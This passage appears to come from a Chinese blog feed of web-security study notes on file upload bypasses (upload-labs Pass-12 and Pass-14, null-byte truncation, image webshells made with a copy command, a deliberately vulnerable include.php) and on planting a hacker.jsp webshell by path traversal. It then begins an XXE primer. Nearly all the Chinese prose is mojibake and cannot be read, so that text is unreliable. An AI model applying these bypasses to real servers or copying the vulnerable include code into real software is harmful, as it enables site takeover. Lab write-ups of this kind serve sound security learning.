æ–‡ä»¶åä¸º<code>xxx.php%00.jpg</code>,å…¶ä¸­<code>%00</code>ä¸ºåå…­è¿›åˆ¶çš„<code>0x00</code>å­—ç¬¦ï¼Œ.jpgéª—è¿‡äº†åº”ç”¨çš„ä¸Šä¼ æ–‡ä»¶ç±»å‹æ£€æµ‹ï¼Œä½†å¯¹äºæœåŠ¡å™¨æ¥è¯´ï¼Œå› ä¸º<code>%00</code>å­—ç¬¦æˆªæ–­çš„å…³ç³»ï¼Œæœ€ç»ˆä¸Šä¼ çš„æ–‡ä»¶å˜æˆäº†<code>xxx.php</code>ã€‚</p><p>æµ‹è¯•ï¼šupload-labs/Pass-12</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418232436067.png" alt="image-20210418232436067"></p><p>ç™½åå•åˆ¤æ–­ï¼Œä½†$img_pathæ˜¯ç›´æ¥æ‹¼æ¥ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨%00æˆªæ–­ç»•è¿‡ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure><blockquote><p>æˆªæ–­æ¡ä»¶ï¼šphpç‰ˆæœ¬å°äº5.3.4ï¼Œphpçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€</p></blockquote><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210418232327452.png" alt="image-20210418232327452"></p><h2 id="ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹"><a href="#ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹" class="headerlink" title="ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹"></a>ç»•è¿‡æ–‡ä»¶å†…å®¹æ£€æµ‹</h2><p>æ–‡ä»¶å¤´æ ¡éªŒåŸç†ï¼šåˆ¤æ–­æ–‡ä»¶å¤´å†…å®¹æ˜¯å¦ç¬¦åˆè¦æ±‚ã€‚</p><p>å¸¸è§çš„æ–‡ä»¶å¤´å¯¹åº”å…³ç³»ï¼š</p><ul><li>.jpegã€jpgï¼šJPGGraphicFile</li><li>.gifï¼šGIF 89A</li><li>.zipï¼šZip Compressed</li></ul><p>ç»•è¿‡æ–‡ä»¶å¤´æ£€æŸ¥ï¼šä¸Šä¼ å›¾ç‰‡é©¬ï¼Œé€šè¿‡æ·»åŠ æ–‡ä»¶å¤´ç»•è¿‡å›¾ç‰‡ç±»å‹å†…å®¹æ£€æŸ¥ã€‚</p><p>çªç ´getimagesize()å‡½æ•°ï¼šå›¾åƒæ–‡ä»¶ç›¸å…³ä¿¡æ¯å¸¸ç”¨æ£€æµ‹å‡½æ•°ï¼Œç”¨ä»¥è·å–æ–‡ä»¶ç±»å‹ï¼Œç»•è¿‡åªéœ€è¦æŠŠæ–‡ä»¶å¤´éƒ¨åˆ†ä¼ªé€ å¥½ã€‚</p><p>æµ‹è¯•ï¼šupload-labs/Pass-14</p><p>æºç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = fopen(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = fread(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    fclose(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @unpack(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = intval(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = getReailFileType(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡è¯»æ–‡ä»¶çš„å‰2ä¸ªå­—èŠ‚åˆ¤æ–­æ–‡ä»¶ç±»å‹ï¼Œå› æ­¤ç›´æ¥ä¸Šä¼ å›¾ç‰‡é©¬å³å¯ï¼Œåˆ¶ä½œå›¾ç‰‡é©¬(cmdä¸‹copyå‘½ä»¤)ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.gif /b + test.php /a shell.gif</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210424143058835.png" alt="image-20210424143058835"></p><p>ç›´æ¥è®¿é—®å›¾ç‰‡å¹¶ä¸èƒ½æŠŠå›¾ç‰‡å½“åšPHPè§£æï¼Œå› æ­¤è¿˜éœ€è¦åˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##include.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">æœ¬é¡µé¢å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œç”¨äºæµ‹è¯•å›¾ç‰‡é©¬æ˜¯å¦èƒ½æ­£å¸¸è¿è¡Œï¼</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">header(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(<span class="keyword">__file__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210424143216004.png" alt="image-20210424143216004"></p><h1 id="ä¸Šä¼ æ¼æ´æ£€æµ‹"><a href="#ä¸Šä¼ æ¼æ´æ£€æµ‹" class="headerlink" title="ä¸Šä¼ æ¼æ´æ£€æµ‹"></a>ä¸Šä¼ æ¼æ´æ£€æµ‹</h1><ol><li>ç™»é™†ç½‘ç«™ï¼Œå¹¶æ‰“å¼€æ–‡ä»¶ä¸Šä¼ é¡µé¢ã€‚</li><li>ç‚¹å‡»â€œæµè§ˆâ€æŒ‰é’®ï¼Œå¹¶é€‰æ‹©æœ¬åœ°çš„ä¸€ä¸ªJSPæ–‡ä»¶(æ¯”å¦‚ hacker.jsp)ï¼Œç¡®è®¤ä¸Šä¼ ã€‚</li><li>å¦‚æœå®¢æˆ·ç«¯è„šæœ¬é™åˆ¶äº†ä¸Šä¼ æ–‡ä»¶çš„ç±»å‹(æ¯”å¦‚å…è®¸gifæ–‡ä»¶)ï¼Œåˆ™æŠŠ hacker.jsp æ›´åä¸º hacker.gifï¼›é…ç½® HTTP Proxy(burp) è¿›è¡Œ http è¯·æ±‚æ‹¦æˆªï¼›é‡æ–°ç‚¹å‡»â€œæµè§ˆâ€æŒ‰é’®ï¼Œå¹¶é€‰æ‹© hacker.giftï¼Œç¡®è®¤ä¸Šä¼ ã€‚</li><li>åœ¨WebScarabæ‹¦æˆªçš„HTTPè¯·æ±‚æ•°æ®ä¸­ï¼Œå°† hacker.gif ä¿®æ”¹ä¸º hacker.jspï¼Œå†å‘é€è¯·æ±‚æ•°æ®ã€‚</li><li>ç™»é™†åå°æœåŠ¡å™¨ï¼Œç”¨å‘½ä»¤<code>find / -name hacker.jsp</code>æŸ¥çœ‹ hacker.jsp æ–‡ä»¶å­˜æ”¾çš„è·¯å¾„ã€‚å¦‚æœå¯ä»¥ç›´æ¥ä»¥Webæ–¹å¼è®¿é—®ï¼Œåˆ™æ„é€ è®¿é—®çš„URLï¼Œå¹¶é€šè¿‡æµè§ˆå™¨è®¿é—® hacker.jspï¼Œå¦‚æœå¯ä»¥æ­£å¸¸è®¿é—®ï¼Œåˆ™å·²ç»å–å¾—WebShellï¼Œæµ‹è¯•ç»“æŸã€‚å¦‚æœ hacker.jsp æ— æ³•é€šè¿‡ web æ–¹å¼è®¿é—®ï¼Œä¾‹å¦‚ hacker.jsp å­˜æ”¾åœ¨ /home/tmp/ ç›®å½•ä¸‹ï¼Œè€Œ /home/tomcat/webapps ç›®å½•å¯¹åº”<a href="http://www.example.com/%EF%BC%8C%E5%88%99%E8%BF%9B%E8%A1%8C%E4%B8%8B%E4%B8%80%E6%AD%A5%E3%80%82">http://www.example.com/ï¼Œåˆ™è¿›è¡Œä¸‹ä¸€æ­¥ã€‚</a></li><li>é‡å¤1ï½3ï¼Œåœ¨burpæ‹¦æˆªçš„HTTPè¯·æ±‚æ•°æ®ä¸­ï¼Œå°†hacker.gifä¿®æ”¹ä¸º../tomcat/webapps/hacker.jspï¼Œå†å‘é€è¯·æ±‚æ•°æ®ã€‚åœ¨æµè§ˆå™¨åœ°å€æ è¾“å…¥<a href="http://www.example.com/hacker.jsp%EF%BC%8C%E8%AE%BF%E9%97%AE%E8%AF%A5%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F%EF%BC%8C%E5%8F%96%E5%BE%97WebShell%EF%BC%8C%E7%BB%93%E6%9D%9F%E6%A3%80%E6%B5%8B%E3%80%82">http://www.example.com/hacker.jspï¼Œè®¿é—®è¯¥åé—¨ç¨‹åºï¼Œå–å¾—WebShellï¼Œç»“æŸæ£€æµ‹ã€‚</a></li></ol><h1 id="ä¸Šä¼ æ¼æ´é˜²å¾¡"><a href="#ä¸Šä¼ æ¼æ´é˜²å¾¡" class="headerlink" title="ä¸Šä¼ æ¼æ´é˜²å¾¡"></a>ä¸Šä¼ æ¼æ´é˜²å¾¡</h1><ol><li>æ–‡ä»¶ä¸Šä¼ çš„ç›®å½•è®¾ç½®ä¸ºä¸å¯æ‰§è¡Œ<br>æœ€æœ‰æ•ˆçš„ï¼Œå°†æ–‡ä»¶ä¸Šä¼ ç›®å½•ç›´æ¥è®¾ç½®ä¸ºä¸å¯æ‰§è¡Œï¼Œå¯¹äºLinuxè€Œè¨€ï¼Œæ’¤é”€å…¶ç›®å½•çš„â€™xâ€™æƒé™ï¼›å®é™…ä¸­å¾ˆå¤šå¤§å‹ç½‘ç«™çš„ä¸Šä¼ åº”ç”¨éƒ½ä¼šæ”¾ç½®åœ¨ç‹¬ç«‹çš„å­˜å‚¨ä¸Šä½œä¸ºé™æ€æ–‡ä»¶å¤„ç†ï¼Œä¸€æ˜¯æ–¹ä¾¿ä½¿ç”¨ç¼“å­˜åŠ é€Ÿé™ä½èƒ½è€—ï¼ŒäºŒæ˜¯æœç»äº†è„šæœ¬æ‰§è¡Œçš„å¯èƒ½æ€§ã€‚</li><li>åˆ¤æ–­æ–‡ä»¶ç±»å‹<br>åœ¨åˆ¤æ–­æ–‡ä»¶ç±»å‹æ—¶ï¼Œå¯ä»¥ç»“åˆä½¿ç”¨MIME Typeã€åç¼€æ£€æŸ¥ç­‰æ–¹å¼ã€‚åœ¨æ–‡ä»¶ç±»å‹æ£€æŸ¥ä¸­ï¼Œå¼ºçƒˆæ¨èç™½åå•æ–¹å¼ï¼Œé»‘åå•çš„æ–¹å¼å·²ç»æ— æ•°æ¬¡è¢«è¯æ˜æ˜¯ä¸å¯é çš„ã€‚æ­¤å¤–ï¼Œå¯¹äºå›¾ç‰‡çš„å¤„ç†ï¼Œå¯ä»¥ä½¿ç”¨å‹ç¼©å‡½æ•°æˆ–è€…resizeå‡½æ•°ï¼Œåœ¨å¤„ç†å›¾ç‰‡çš„åŒæ—¶ç ´åå›¾ç‰‡ä¸­å¯èƒ½åŒ…å«çš„HTMLä»£ç ã€‚</li><li>ä½¿ç”¨éšæœºæ•°æ”¹å†™æ–‡ä»¶åå’Œæ–‡ä»¶è·¯å¾„<br>æ–‡ä»¶ä¸Šä¼ å¦‚æœè¦æ‰§è¡Œä»£ç ï¼Œåˆ™éœ€è¦ç”¨æˆ·èƒ½å¤Ÿè®¿é—®åˆ°è¿™ä¸ªæ–‡ä»¶ã€‚åœ¨æŸäº›ç¯å¢ƒä¸­ï¼Œç”¨æˆ·èƒ½ä¸Šä¼ ï¼Œä½†ä¸èƒ½è®¿é—®ã€‚å¦‚æœåº”ç”¨äº†éšæœºæ•°æ”¹å†™äº†æ–‡ä»¶åå’Œè·¯å¾„ï¼Œå°†æå¤§åœ°å¢åŠ æ”»å‡»çš„æˆæœ¬ã€‚å†æ¥å°±æ˜¯åƒshell.php.rar.rarå’Œcrossdomain.xmlè¿™ç§æ–‡ä»¶ï¼Œéƒ½å°†å› ä¸ºé‡å‘½åè€Œæ— æ³•æ”»å‡»ã€‚</li><li>å•ç‹¬è®¾ç½®æ–‡ä»¶æœåŠ¡å™¨çš„åŸŸå<br>ç”±äºæµè§ˆå™¨åŒæºç­–ç•¥çš„å…³ç³»ï¼Œä¸€ç³»åˆ—å®¢æˆ·ç«¯æ”»å‡»å°†å¤±æ•ˆï¼Œæ¯”å¦‚ä¸Šä¼ crossdomain.xmlã€ä¸Šä¼ åŒ…å«Javascriptçš„XSSåˆ©ç”¨ç­‰é—®é¢˜å°†å¾—åˆ°è§£å†³ã€‚</li></ol><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] <a href="https://blog.csdn.net/weixin_39190897/article/details/85334893">Webå®‰å…¨-æ–‡ä»¶ä¸Šä¼ æ¼æ´ä¸WAFç»•è¿‡</a></p><p>[2] <a href="https://blog.csdn.net/weixin_44677409/article/details/92799366">upload-labsé€šå…³è®°å½•</a></p>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Webå®‰å…¨å­¦ä¹  </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXEæ¼æ´å­¦ä¹ </title>
      <link href="posts/19226.html"/>
      <url>posts/19226.html</url>
      
        <content type="html"><![CDATA[<h1 id="XXEç®€ä»‹"><a href="#XXEç®€ä»‹" class="headerlink" title="XXEç®€ä»‹"></a>XXEç®€ä»‹</h1><p>XXE ï¼ˆXML EXternal Entityï¼‰å³XMLå¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ï¼Œæ˜¯ä¸€ç§å¸¸è§çš„Webå®‰å…¨æ¼æ´ï¼Œå‘ç”Ÿåœ¨åº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶ï¼Œæ²¡æœ‰ç¦æ­¢å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡XMLçš„å¤–éƒ¨å®ä½“è·å–æœåŠ¡å™¨ä¸­æœ¬åº”è¢«ä¿æŠ¤çš„æ•°æ®ã€‚å¦‚å½“å¼•ç”¨å¤–éƒ¨å®ä½“æ—¶ï¼Œé€šè¿‡æ„é€ æ¶æ„å†…å®¹ï¼Œå¯å¯¼è‡´è¯»å–ä»»æ„æ–‡ä»¶ã€æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€æ¢æµ‹å†…ç½‘ç«¯å£ã€æ”»å‡»å†…ç½‘ç½‘ç«™ç­‰å±å®³ã€‚</p><h1 id="XMLåŸºç¡€"><a href="#XMLåŸºç¡€" class="headerlink" title="XMLåŸºç¡€"></a>XMLåŸºç¡€</h1><p>å­¦ä¹ XXEï¼Œå…ˆæ¥äº†è§£ä¸€ä¸‹XMLã€‚</p><p>XMLæ˜¯ä¸€ç§ç”¨äºæ ‡è®°ç”µå­æ–‡ä»¶ä½¿å…¶å…·æœ‰ç»“æ„æ€§çš„å¯æ‰©å±•æ ‡è®°è¯­è¨€(Extensible Markup Languageï¼‰ </p><p>XMLæ˜¯ä¸€ç§éå¸¸çµæ´»çš„è¯­è¨€ï¼Œç±»ä¼¼äºHTMLè¯­è¨€ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰å›ºå®šçš„æ ‡ç­¾ã€‚æ‰€æœ‰çš„æ ‡ç­¾éƒ½å¯ä»¥è‡ªå®šä¹‰ï¼Œå…¶è®¾è®¡çš„å®—æ—¨æ˜¯ä¼ è¾“å’Œå­˜å‚¨æ•°æ®ï¼Œè€Œä¸æ˜¯åƒHTMLä¸€æ ·æ˜¾ç¤ºæ•°æ®ã€‚</p><p>XMLä¸ä¼šåšä»»ä½•äº‹æƒ…ï¼Œå®ƒæ˜¯è¢«è®¾è®¡ç”¨æ¥ç»“æ„åŒ–ã€å­˜å‚¨ä»¥åŠä¼ è¾“ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯XMLæ–‡ä»¶æ‰€æºå¸¦çš„ä¿¡æ¯ï¼Œéœ€è¦è¢«å…¶ä»–çš„è¯­è¨€æˆ–è€…ç¨‹åºæ¥è§£æï¼Œæ‰èƒ½å‘æŒ¥ä½œç”¨ã€‚</p><h2 id="XMLè§£æ"><a href="#XMLè§£æ" class="headerlink" title="XMLè§£æ"></a>XMLè§£æ</h2><p>æµç¨‹å›¾</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/U329ff4f7d6a14d788b5e54a8f7ec05e3z.jpg" alt="å›¾ç‰‡"></p><ol><li>ç¨‹åº(Application)æ¥æ”¶åˆ°ç”¨æˆ·ä¼ é€’è¿‡æ¥çš„æ•°æ®ï¼Œç„¶åå°†å…¶äº¤ç»™XML Generator(XMLç”Ÿæˆå™¨)ã€‚</li><li>XML Generator(XMLç”Ÿæˆå™¨)åœ¨æ¥æ”¶åˆ°ç¨‹åºä¼ é€’è¿‡æ¥çš„æ•°æ®å,ä¼šå°†è¿™äº›æ•°æ®è¿›è¡Œä¸€ä¸ªè§„èŒƒåŒ–ï¼Œæœ€ç»ˆç”ŸæˆXMLæ•°æ®ã€‚</li><li>XML Generator(XMLç”Ÿæˆå™¨)åœ¨ç”ŸæˆXMLæ•°æ®åï¼Œç„¶åä¼šç”±æˆ‘ä»¬çš„HTTPå®¢æˆ·ç«¯(HTTP Client)å°†å…¶(XMLæ•°æ®)é€šè¿‡HTTPåè®®ä¼ é€’ç»™æœåŠ¡ç«¯(Web Server)ã€‚</li><li>Web Serveråœ¨æ¥æ”¶åˆ°XMLæ•°æ®ååˆ™ä¼šå°†å…¶äº¤ç»™XML Parser(XMLè§£æå™¨)ã€‚</li><li>XMLè§£æå™¨åˆ™ä¼šå¯¹æ¥æ”¶åˆ°çš„XMLæ•°æ®è¿›è¡Œä¸€ä¸ªè§£æå¤„ç†,ç„¶åå°†ä¿¡æ¯è¿”å›ç»™ç¨‹åº(Application)ï¼Œæœ€ç»ˆå‘ˆç°ç»™ç”¨æˆ·ã€‚</li></ol><h2 id="XMLè¯­æ³•"><a href="#XMLè¯­æ³•" class="headerlink" title="XMLè¯­æ³•"></a>XMLè¯­æ³•</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">(1) XML æ–‡æ¡£å¿…é¡»æœ‰ä¸€ä¸ªæ ¹å…ƒç´ </span><br><span class="line">è§£é‡Š:å°±æ˜¯è¯´åœ¨XMLæ–‡æ¡£ä¸­å¿…é¡»æœ‰ä¸€ä¸ªå…ƒç´ æ˜¯å…¶ä»–å…ƒç´ çš„çˆ¶å…ƒç´ (ä¹Ÿå°±æ˜¯è¯´å…¶ä»–å…ƒç´ å¿…é¡»åŒ…å«åœ¨è¿™ä¸ªæ ¹å…ƒç´ ä¸‹).æ ¹å…ƒç´ ä¸å…¶ä»–å…ƒç´ çš„å…³ç³»:çˆ¶å­å…³ç³».</span><br><span class="line"></span><br><span class="line">(2) XML å…ƒç´ éƒ½å¿…é¡»æœ‰ä¸€ä¸ªå…³é—­æ ‡ç­¾</span><br><span class="line">è§£é‡Š:ä¹Ÿå°±æ˜¯è¯´XMLå…ƒç´ å¿…é¡»æœ‰å¤´æœ‰å°¾,ä¸€å¯¹ä¸€å¯¹çš„å‡ºç°.</span><br><span class="line"></span><br><span class="line">(3) XML æ ‡ç­¾å¯¹å¤§å°æ•æ„Ÿ</span><br><span class="line">è§£é‡Š:XMLæ ‡ç­¾çš„å¼€å§‹æ ‡ç­¾å’Œé—­åˆæ ‡ç­¾å¿…é¡»å¤§å°å†™ä¸€è‡´.(ä¸èƒ½ä¸€ä¸ªå¤§å†™ä¸€ä¸ªå°å†™)</span><br><span class="line">å¦‚:&lt;abc&gt;&lt;&#x2F;Abc&gt;       &#x2F;&#x2F;&#x2F;è¿™æ ·å°±æ˜¯é”™è¯¯çš„!</span><br><span class="line"></span><br><span class="line">(4) XML å…ƒç´ å¿…é¡»è¢«æ­£ç¡®çš„åµŒå¥—</span><br><span class="line">è§£é‡Š:XMLå…ƒç´ åœ¨åµŒå¥—ä½¿ç”¨çš„æ—¶å€™,å¿…é¡»æ˜¯ä¸€å¯¹ä¸€å¯¹çš„åµŒå¥—,ä¸èƒ½åªåµŒå¥—ä¸€ä¸ªç»“æŸæ ‡ç­¾æˆ–ä¸€ä¸ªå¼€å§‹æ ‡ç­¾.</span><br><span class="line">å¦‚:&lt;abc&gt;&lt;test&gt;&lt;&#x2F;abc&gt;&lt;&#x2F;test&gt;       &#x2F;&#x2F;è¿™æ ·å°±æ˜¯é”™è¯¯çš„</span><br><span class="line">&lt;abc&gt;&lt;test&gt;&lt;&#x2F;test&gt;&lt;&#x2F;abc&gt;          &#x2F;&#x2F;æ­£ç¡®çš„åµŒå¥—</span><br><span class="line"></span><br><span class="line">(5) XML å±æ€§å€¼å¿…é¡»åŠ å¼•å·</span><br><span class="line">è§£é‡Š:XMLå…ƒç´ åœ¨è®¾ç½®äº†å±æ€§å,å…¶å±æ€§å€¼å¿…é¡»ç”¨å¼•å·åŒ…è£¹.</span><br><span class="line">å¦‚:&lt;abc color&#x3D;blue&gt;               &#x2F;&#x2F;è¿™æ ·æ˜¯é”™è¯¯çš„</span><br></pre></td></tr></table></figure><h2 id="XMLç»“æ„"><a href="#XMLç»“æ„" class="headerlink" title="XMLç»“æ„"></a>XMLç»“æ„</h2><p>XMLç»“æ„åŒ…æ‹¬XMLå£°æ˜ã€DTDæ–‡æ¡£ç±»å‹å®šä¹‰ï¼ˆå¯é€‰ï¼‰ã€æ–‡æ¡£å…ƒç´ ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210407213410158.png" alt="image-20210407213410158"></p><p>XMLå£°æ˜å‘Šè¯‰æµè§ˆå™¨è¿™æ˜¯ä¸€ä¸ªXMLæ–‡æ¡£ã€‚versionå±æ€§æ˜¯å¿…é¡»çš„ï¼Œencondingå±æ€§è¯´æ˜æ–‡æ¡£çš„å­—ç¬¦é›†ç¼–ç ã€‚</p><p>æˆ‘ä»¬å¯ä»¥æŠŠDTDç†è§£ä¸ºä¸€ä¸ªæ¨¡æ¿ï¼Œè¿™ä¸ªæ¨¡æ¿é‡Œé¢å®šä¹‰äº†ç”¨æˆ·è‡ªå·±åˆ›å»ºçš„æ ¹å…ƒç´ ä»¥åŠå¯¹åº”çš„å­å…ƒç´ ã€‚è€Œâ€æ–‡æ¡£å…ƒç´ â€åˆ™å¿…é¡»ä»¥æˆ‘ä»¬çš„DTDä¸ºæ¨¡æ¿ï¼Œæ¥å¯¹XMLçš„å…ƒç´ çš„å†…å®¹è¿›è¡Œç›¸åº”çš„è§„èŒƒåŒ–ã€‚</p><p><strong>PCDATA</strong> çš„æ„æ€æ˜¯è¢«è§£æçš„å­—ç¬¦æ•°æ®ï¼ˆparsed character dataï¼‰ï¼Œæ˜¯ä¼šè¢«è§£æå™¨è§£æçš„æ–‡æœ¬ï¼Œè¿™äº›æ–‡æœ¬å°†è¢«è§£æå™¨æ£€æŸ¥å®ä½“ä»¥åŠæ ‡è®°ã€‚</p><p><strong>CDATA</strong> æŒ‡çš„æ˜¯ä¸åº”ç”± XML è§£æå™¨è¿›è¡Œè§£æçš„æ–‡æœ¬æ•°æ®ï¼ˆUnparsed Character Dataï¼‰ã€‚åœ¨ XML å…ƒç´ ä¸­ï¼Œâ€&lt;â€ ï¼ˆæ–°å…ƒç´ çš„å¼€å§‹ï¼‰å’Œ â€œ&amp;â€ ï¼ˆå­—ç¬¦å®ä½“çš„å¼€å§‹ï¼‰æ˜¯éæ³•çš„ã€‚è€ŒæŸäº›æ–‡æœ¬ï¼Œæ¯”å¦‚ JavaScript ä»£ç ï¼ŒåŒ…å«å¤§é‡ â€œ&lt;â€ æˆ– â€œ&amp;â€ å­—ç¬¦ã€‚ä¸ºäº†é¿å…é”™è¯¯ï¼Œå¯ä»¥å°†è„šæœ¬ä»£ç 